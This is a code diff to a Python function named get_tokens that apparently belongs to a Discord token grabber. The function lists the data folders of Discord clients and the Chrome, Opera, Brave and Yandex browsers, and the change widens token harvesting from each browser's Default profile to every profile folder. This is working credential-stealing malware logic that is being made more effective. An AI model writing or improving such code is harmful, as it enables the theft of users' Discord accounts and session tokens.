@@ -96,10 +96,10 @@ def get_tokens():
         'Discord PTB': roaming + '\\discordptb',
         'Discord Development': roaming + '\\discorddevelopment',
         'Lightcord': roaming + '\\lightcord',
-        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+        'Google Chrome': local + '\\Google\\Chrome\\User Data',
         'Opera': roaming + '\\Opera Software\\Opera Stable',
-        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data',
+        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data'
     }
 
     for platform, path in platforms.items():
@@ -110,7 +110,9 @@ def get_tokens():
                 if not len(tokens) > 0:
                     tokens = find_platform(path)
             else:
-                tokens = find_platform(path)
+                profiles = [os.path.join(path, folder) for folder in os.listdir(path) if folder.startswith('Profile') or folder == 'Default']
+                for profile in profiles:
+                    tokens = find_platform(profile)
 
             if len(tokens) > 0:
                 for token in tokens:
